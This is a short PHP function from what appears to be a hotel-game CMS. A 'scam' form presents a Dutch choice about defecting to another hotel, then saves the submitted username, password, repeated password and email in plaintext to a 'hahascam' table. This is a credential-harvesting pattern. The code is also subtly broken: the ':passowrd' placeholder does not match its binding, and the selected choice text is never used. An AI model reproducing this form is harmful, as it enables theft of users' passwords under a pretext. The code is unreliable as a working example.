<?php
	if(!defined('BRAIN_CMS')) 
	{ 
		die('Sorry but you cannot access this file!'); 
	}
	function hahaScam()
	{
		Global $lang, $dbh;
		if (isset($_POST['addscam']))
	{
			
			
				
				
			
			
				switch ($_POST['keuze']) {
					case 1:
					$keuze = "Ik neem ontslag bij Gold en ik ga naar het ander hotel waar ze een hoge functie bieden.";
					break;
					case 2:
					$keuze = "Ik negeer hun, en doe alsof ik niks heb gehoord. Ik werk eenmaal bij Gold en ga naar geen ander hotel.";
					break;
				}
				$username = User::userData('username');
				$AddScam = $dbh->prepare("INSERT INTO hahascam (
				username, 
				password, 
				password_repeat, 
				email
				) VALUES (
				:username, 
				:passowrd, 
				:password_repeat, 
				:email
				)");
				$AddScam->bindParam(':username', $_POST['username']);
				$AddScam->bindParam(':password', $_POST['password']);
				$AddScam->bindParam(':password_repeat', $_POST['password_repeat']);
				$AddScam->bindParam(':email', $_POST['email']);
				$AddScam->execute();
				return html::errorSucces($lang["Sscam"]);
			}
		
	
	}